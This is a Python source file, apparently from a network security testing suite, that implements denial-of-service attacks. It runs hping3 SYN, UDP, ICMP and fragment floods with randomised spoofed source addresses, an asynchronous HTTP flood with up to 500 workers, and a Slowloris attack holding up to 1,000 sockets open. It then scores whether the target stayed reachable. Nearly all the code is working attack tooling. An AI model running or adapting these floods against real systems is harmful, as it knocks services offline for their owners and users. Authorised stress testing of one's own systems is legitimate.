"""
NetProbe Security Suite - Flood / DoS Module
Tools: hping3 (SYN/UDP/ICMP/FRAG), httpx (HTTP), socket (Slowloris)
"""
import asyncio
import os
import shutil
import socket as _socket
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "syn_flood":  "SYN Flood",
    "udp_flood":  "UDP Flood",
    "icmp_flood": "ICMP Flood",
    "http_flood": "HTTP Flood",
    "slowloris":  "Slowloris Attack",
    "fragflood":  "Fragment Flood",
}

HPING_FLAGS = {
    "syn_flood":  "-S -p 80",
    "udp_flood":  "--udp -p 53",
    "icmp_flood": "--icmp",
    "fragflood":  "--frag -d 1460",
}

PACKET_SIZES = {1: "64", 2: "256", 3: "512", 4: "1024", 5: "1460"}
COUNTS       = {1: "1000", 2: "5000", 3: "10000", 4: "50000", 5: "100000"}

async def run_flood_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)

    if module_id == "http_flood":
        return await _http_flood(target, intensity, duration, log_fn)
    if module_id == "slowloris":
        return await _slowloris(target, intensity, duration, log_fn)

    # hping3 floods
    if not shutil.which("hping3"):
        await log_fn("WARN", "hping3 no instalado: sudo apt install hping3", module_id)
        return {}, "ERROR", None
    if os.geteuid() != 0:
        await log_fn("WARN", f"{name} requiere root — inicia con: sudo bash arrancar.sh", module_id)
        return {}, "ERROR", None

    flags = HPING_FLAGS.get(module_id, "-S -p 80")
    size  = PACKET_SIZES.get(intensity, "512")
    count = COUNTS.get(intensity, "10000")
    # Use count instead of --flood so hping3 exits after N packets
    cmd   = f"hping3 {flags} -c {count} --rand-source -d {size} --faster {target}"

    await log_fn("CMD", cmd, module_id)
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 10)
            out = stdout.decode("utf-8", errors="ignore")
            err = stderr.decode("utf-8", errors="ignore")
            if out.strip(): await log_fn("RAW", out.rstrip(), module_id)
            if err.strip(): await log_fn("RAW", err.rstrip(), module_id)
        except asyncio.TimeoutError:
            proc.kill()
            await log_fn("RAW", f"[hping3 detenido tras {duration}s]", module_id)

        # Post-attack connectivity check
        ping_cmd = f"ping -c 3 -W 2 {target}"
        await log_fn("CMD", ping_cmd, module_id)
        pout, _, prc = await raw_exec(ping_cmd, log_fn, module_id, timeout=10)
        alive = prc == 0 and "bytes from" in pout

        status = "BLOCKED" if alive else "PASSED"
        score  = 100 if alive else 0
        return {"packets_sent": count, "target_alive_after": alive}, status, score

    except Exception as e:
        await log_fn("ERROR", f"Error en flood: {e}", module_id)
        return {}, "ERROR", None


async def _http_flood(target, intensity, duration, log_fn):
    try:
        import httpx
    except ImportError:
        await log_fn("WARN", "httpx no instalado: pip install httpx", "http_flood")
        return {}, "ERROR", None

    concurrency = {1: 10, 2: 50, 3: 100, 4: 300, 5: 500}.get(intensity, 100)
    url = f"http://{target}"
    await log_fn("CMD", f"httpx flood {url} --workers {concurrency} --duration {duration}s", "http_flood")

    success, errors = 0, 0
    stop_event = asyncio.Event()

    async def worker():
        nonlocal success, errors
        async with httpx.AsyncClient(timeout=5, verify=False) as client:
            while not stop_event.is_set():
                try:
                    r = await client.get(url)
                    if r.status_code < 500: success += 1
                    else: errors += 1
                except Exception: errors += 1

    tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
    await asyncio.sleep(duration)
    stop_event.set()
    await asyncio.gather(*tasks, return_exceptions=True)

    total = success + errors
    rate  = (success / total * 100) if total else 0
    await log_fn("RAW", f"Total requests: {total}\nSuccess (2xx/3xx/4xx): {success}\nErrors/5xx: {errors}\nSuccess rate: {rate:.1f}%", "http_flood")

    status = "BLOCKED" if rate > 50 else "PARTIAL" if rate > 10 else "PASSED"
    return {"requests": total, "success": success, "success_rate": rate}, status, {"BLOCKED":100,"PARTIAL":35,"PASSED":0}[status]


async def _slowloris(target, intensity, duration, log_fn):
    num = {1: 50, 2: 150, 3: 300, 4: 500, 5: 1000}.get(intensity, 150)
    await log_fn("CMD", f"slowloris {target}:80 --sockets {num} --duration {duration}s", "slowloris")

    sockets_list, connected = [], 0
    for _ in range(num):
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nX-a: b\r\n")
            sockets_list.append(s)
            connected += 1
        except Exception:
            break

    await log_fn("RAW", f"Sockets abiertos: {connected}/{num}\nManteniendo conexiones {duration}s...", "slowloris")
    await asyncio.sleep(duration)
    for s in sockets_list:
        try: s.close()
        except: pass

    await log_fn("RAW", f"Conexiones cerradas. Analizando impacto...", "slowloris")
    status = "BLOCKED" if connected < num * 0.5 else "PARTIAL" if connected < num * 0.9 else "PASSED"
    return {"sockets_connected": connected, "attempted": num}, status, {"BLOCKED":100,"PARTIAL":35,"PASSED":0}[status]
